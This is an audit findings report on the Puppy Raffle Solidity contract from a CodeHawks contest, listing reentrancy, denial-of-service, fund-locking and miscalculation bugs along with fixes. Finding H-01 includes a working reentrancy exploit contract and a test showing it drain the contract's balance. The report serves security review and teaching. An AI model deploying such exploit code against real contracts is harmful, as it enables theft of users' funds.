# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. PuppyRaffle::refund() vulnerable to reentrancy and Attacker can drain all the funds. ](#H-01)
    - ### [H-02. Loss of funds if the winner selected == address(0)](#H-02)
    - ### [H-03. totalAmountCollected value is incorrectly calculated inside PuppyRaffle::selectWinner()](#H-03)
    - ### [H-04. PuppyRaffle::selectWinner lags the implementation to send fees to fee address](#H-04)
    - ### [H-05. There is no guarantee that PuppyRaffle::selectWinner() will be called every X seconds even if there are more than or eq to 4 players.](#H-05)
    - ### [H-06. PuppyRaffle::enterRaffle() and PuppyRaffle::selectWinner() vulnerable to DoS attack.](#H-06)
- ## Medium Risk Findings
    - ### [M-01. PuppyRaffle::withdrawFees() function can suffer from DoS and it can never be called.](#M-01)
    - ### [M-02. PuppyRaffle::enterRaffle() will revert due to gas limits as more and more people enter raffle](#M-02)
- ## Low Risk Findings
    - ### [L-01. PuppyRaffle::getActivePlayerIndex misguides if the player is not active.](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 6
   - Medium: 2
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. PuppyRaffle::refund() vulnerable to reentrancy and Attacker can drain all the funds.             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L96

## Summary
The PuppyRaffle contract is susceptible to a reentrancy attack, and Attacker can repeatedly invoke the ```refund``` function before the players array is updated. Thus attacker can repeatedly call the refund function and drain all the funds.

## Vulnerability Details
The contract's ```refund``` function does not follow the CEI (Checks Effects Interactions) pattern. The contract updates the players array state after the funds are sent to user. Attacker can take the advantage of this external function call to again invoke the ```refund``` function and as the state (players array) is not updated, attacker can repeatedly invoke the ```refund``` function through the external call.

## PoC
### AttackPuppyRaffle.sol      (src/attack/AttackPuppyRaffle.sol)
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.7.6;

import { PuppyRaffle } from "../PuppyRaffle.sol";

contract AttackPuppyRaffle {
    uint256 public idx;
    PuppyRaffle public puppyRaffle;

    address public owner;

    constructor(address raffle) {
        puppyRaffle = PuppyRaffle(raffle);
        owner = msg.sender;
    }

    function refundAttack(uint256 _idx) external {
        idx = _idx;
        puppyRaffle.refund(_idx);
    }

    function withdrawLootedEth() external {
        require(msg.sender == owner);

        (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        try puppyRaffle.refund(idx) {

        }
        catch {

        }
    }
}
```

## Test PoC
Include the below test in ```PuppyRaffleTest.t.sol```

Also include the import: ```import {AttackPuppyRaffle} from "../src/attack/AttackPuppyRaffle.sol";```

Run ```forge test --mt test_AttackerCanDrainAllFunds -vv```
```solidity
function test_AttackerCanDrainAllFunds() public playerEntered {
    uint256 START_BALANCE = 10 ether;
    address attacker = makeAddr("attacker");
    vm.deal(attacker, START_BALANCE);

    vm.prank(attacker);
    AttackPuppyRaffle attackPuppyRaffle = new AttackPuppyRaffle(address(puppyRaffle));

    address[] memory players = new address[](1);
    players[0] = address(attackPuppyRaffle);

    uint256 attackerBalance = attacker.balance;               // balance before entering raffle
        
    console.log("Balance before entering the raffle: ", attackerBalance);

    vm.startPrank(attacker);
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    uint256 idx = 1;    // there is one player already in the raffle, so attacker is 2nd (thus, idx = 1)

    attackPuppyRaffle.refundAttack(idx);

    attackPuppyRaffle.withdrawLootedEth();
    vm.stopPrank();

    uint256 finalAttackerBalance = attacker.balance;    // balance after entering raffle and getting refund

    console.log("Balance after entering and getting refund: ", finalAttackerBalance);
    assert(finalAttackerBalance > attackerBalance);
    assert(address(puppyRaffle).balance == 0);
}
```

## Impact
An attacker can drain all the funds of the PuppyRaffle contract.

## Tools Used
Manual Review

## Recommendations
Follow CEI pattern
```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+   players[playerIndex] = address(0);

    payable(msg.sender).sendValue(entranceFee);

-   players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```
## <a id='H-02'></a>H-02. Loss of funds if the winner selected == address(0)            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L130

## Summary
In PuppyRaffle::selectWinner() function, there is no check if the address selected as winner is address(0). Thus, if the winner select == address(0) then it will lead to loss of all the funds.

## Vulnerability Details
As people can unregister themselves from the raffle by calling the refund() function, and address(0) is stored at their position. So, if in case the winner selected comes out to be address(0) then all the funds are transferred to address(0) and leads to loss of funds.

## Impact
Funds are at risk as they are transferred to address(0) if the idx selected was the person who left the Raffle by calling the refund() function.

## Tools Used
Manual Review

## Recommendations
- We should remove the functionality that allows users to unregister themselves.
- But if we want to keep the functionality, then we can do something like this: If a person at idx i leaves then we can store the address of the last person in players array at idx i and pop the last address out.
## <a id='H-03'></a>H-03. totalAmountCollected value is incorrectly calculated inside PuppyRaffle::selectWinner()            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L131

## Summary
The ```totalAmountCollected``` variable value is wrongly calculated. It uses the ````total length of players * entrance fees``` to calculate the total amount collected which will produce wrong result if some people called the refund function, the total players will decrease but still the players array length will remain the same and as players array length is used to calculate the total amount collected it will lead to reverting of the function call and selectWinner function can never be called as the total amount calculated will be more than the balance of contract.

## Vulnerability Details
It is not always true that the total active players are actually always equal to length of players array because if a person calls the PuppyRaffle::refund() function they will become inactive and are not active in the Raffle, thus they should not be counted while calculating the ```totalAmountCollected``` but as the length of players array will remain the same and is used to calculate ```totalAmountCollected```  therefore it  is wrongly calculated.

So, suppose if 10 players entered the raffle and fees was 1 ETH, so contract balance = 10 ETH.
Now if 3 person leaves then active players = 7 and contract balance will become 7 ETH.
Therefore if we call selectWinner at this instance the ```totalAmountCollected``` should be 7 ETH, but it will give 10 ETH, as it uses the length of players array to calculate that as it will remain unchanged.
And now 80% of 10 ETH will be sent to winner which is 8 ETH and as contract balance is 7 ETH, so this will always revert and select winner can never be called.

Below test is the demonstration for my finding, it can be used in ```PuppyRaffleTest.t.sol```
```solidity
function test_SelectWinner_Reverts_DueToWrongCalculationOfTotalAmountCollected() public {
    uint256 count = 10;
    uint256 START_BALANCE = 10 ether;
    address[] memory gang = new address[](count);

    for (uint160 i = 1; i <= 10; ++i) {
        gang[i - 1] = address(i);
    }

    address attacker = makeAddr("attacker");
    hoax(attacker, count * entranceFee);
    puppyRaffle.enterRaffle{value: count * entranceFee}(gang);

    // At this point PuppyRaffle have 10 active players and 10 eth

    // 3 people leaves the Raffle
    for (uint160 i = 1; i <= 3; ++i) {
        hoax(address(i), START_BALANCE);
        puppyRaffle.refund(i - 1);
    }

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    // At this moment PuppyRaffle have 7 active players and 7 eth

    // this will incorrectly calculate totalAmountCollected as 10 eth but it should be 7 eth
    // as it uses (players.length * entranceFee) to calculate it and it will be equal to 10 eth
    // but it should be 7 eth as total active players are 7
    // so this will try to send 80% of 10 eth to winner but as balance is 7 eth so it will revert
    vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner"); 
    puppyRaffle.selectWinner();        
}
```

## Impact
This will have a negative impact on our lottery system as selectWinner function can't be called in the above case due to wrong calculation of ```totalAmountCollected```.


## Tools Used
Manual Review

## Recommendations
- Use a counter variable for total active players and increment it when a player entered a raffle while decrementing it when one calls refund().
Therefore, 
```solidity
totalAmountCollected = totalPlayersCounter * entranceFees
```
- But if we want to calculate in the similar way by players array length, then when a user calls the refund() function, replace the address at their idx with the address at last most idx and pop the last address out of players array.
## <a id='H-04'></a>H-04. PuppyRaffle::selectWinner lags the implementation to send fees to fee address            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L134

## Summary
No fees sent to the fee address in the PuppyRaffle::selectWinner() function

## Vulnerability Details
The selectWinner function doesn't call the PuppyRaffle::withdrawFees() function to send eth to fee address, this will lead to accumulation of funds in the PuppyRaffle contract and it will remain locked in to the contract.

## Impact
Locking of funds in the contract.

## Tools Used
Manual Review

## Recommendations
To call the withdrawFees() function in the selectWinner() function after sending eth to winner.
## <a id='H-05'></a>H-05. There is no guarantee that PuppyRaffle::selectWinner() will be called every X seconds even if there are more than or eq to 4 players.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L125

## Summary
There is no guarantee that the selectWinner() function will be called every X seconds.

## Vulnerability Details
If no one calls the selectWinner function then the lottery will never happen and no one guarantees that.

## Tools Used
Manual Review

## Recommendations
To use chainlink automation to call the function after every X seconds.
## <a id='H-06'></a>H-06. PuppyRaffle::enterRaffle() and PuppyRaffle::selectWinner() vulnerable to DoS attack.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L79

## Summary
The enterRaffle() function is vulnerable to DoS attack. If a person creates diff accounts then it is never guaranteed that the person entering the raffle is unique, and if they enters the raffle with all of their accounts such that if next person tries to enter raffle the function will revert due to gas limit. 

## Vulnerability Details
So, if a person enters a raffle with different accounts they can prevent people from participating in the raffle.
Also due to the vulnerability in selectWinner() function due to wrong calculation of ```totalAmountCollected``` it will also suffer from DoS.
As, if in case people calls refund function then it will create address(0) at their position but as ```totalAmountCollected``` uses the length of the players array to calculate the amount then it will always be wrong as the active players will actually not be equal to length (if in case refund is called) and as a result of which selectWinner will always revert.

So, if one creates diff accounts and participates in the raffle such that no new person can enter into the raffle due to gas limitations, and calls refund from all of their account, then selectWinner() function will calculate ```totalAmountCollected``` incorrectly and it will always revert and their is no way the raffle can be reset.


## Impact
No person can participate in the raffle due to above discussed case.

## Tools Used
Manual Review

## Recommendations
- Calculate the value of ```totalAmountCollected``` correctly by using counter variable for total players, where this counter will be incremented when a person enter a raffle while it will be decremented when a person leaves.
```solidity
totalAmountCollected = totalActivePlayers * entranceFees
```
- Also, if we want to calculate the ```totalAmountCollected``` in the same manner then when a user leaves the raffle, we can replace the address at their idx with the address at last idx and pop the last one out.
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. PuppyRaffle::withdrawFees() function can suffer from DoS and it can never be called.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L157

## Summary
PuppyRaffle::withdrawFees() will suffer from DoS because as soon as the winner is selected one can have bots call the enterRaffle function and as a result of which it will always revert because the ```totalFees``` will not remain equal to the PuppyRaffle contract's balance as people entered the raffle and it will prevent the fee address from claiming the fees.
Alternatively attackers can also deploy their own attack contract with minimal balance in it and send it to PuppyRaffle, as result of which ```totalFees != address of PuppyRaffle contract``` and it will always revert.

## Vulnerability Details
There are two ways to cause withdrawFees() to suffer from DoS-
- As soon as the winner is selected bots will call the enter raffle function which will make ```totalFees != address(this).balance``` then fee address can never claim the fees.
- Also, attacker can create their own contract containing self destruct which will send the funds to PuppyRaffle contract. ```totalAmountCollected``` will calculate the amount collected from new players, and 80% will be sent to winners and 20% will be added to totalFees, but as attacker sent some amount via self destruct to PuppyRaffle thus the condition ```totalFees == PuppyRaffle balance``` will always return false as balance of contract will always be more than fees even if there are no players as the attacker sent the amount, thus it will prevent fee address from claiming the fees. 
So, by deploying an AttackContract with 1 wei as balance and then call the self destruct within their contract which sends eth to PuppyRaffle thus creating DoS for withdrawFees function.

## Impact
Fee Address can never claim their fees.

## Tools Used
Manual Review

## Recommendations
To send the fees to fee address in the selectWinner function only.
## <a id='M-02'></a>M-02. PuppyRaffle::enterRaffle() will revert due to gas limits as more and more people enter raffle            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L79

## Summary
The enterRaffle() function contains a nested for loop which will consume a large amount of gas and it will not allow people to participate in the raffle after some limit of people entered into it.

## Vulnerability Details
If x number of people entered the raffle that will cause the function to have a time complexity of O(x^2) and that will for sure lead to consumption of a large amount of gas and after some limit of people entered the raffle it will consume the whole gas and will not allow new people to participate into it.

## Impact
Only allow few people to participate in the raffle ans inposes large amount of gas fees on the participants.

## Tools Used
Manual Review

## Recommendations
- To use a mapping mechanism which tracks if a particular people entered or not.
- So, we can have a counter for each round starting from 1 and a ```mapping(address user => uint256 latestRoundParticipated)```.
- If a new person participates we will assign the current round counter to their mapping and if they again calls the enter raffle function for the same round we will check in to their mapping and if it comes out that their value from mapping is equal to current round that means they already participated. This way we can onboard more players to enter in to our raffle.

# Low Risk Findings

## <a id='L-01'></a>L-01. PuppyRaffle::getActivePlayerIndex misguides if the player is not active.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L109

## Summary
The function getActivePlayerIndex will not give accurate result if the player doesn't exist. 

## Vulnerability Details
If a player is not active then it returns 0, which will pretend to caller that the player is active and index is 0.

## Tools Used
Manual Review

## Recommendations
So, if a player is not active then it should revert with an error that the player doesn't exist instead of returning 0, which seems to misguide the caller.


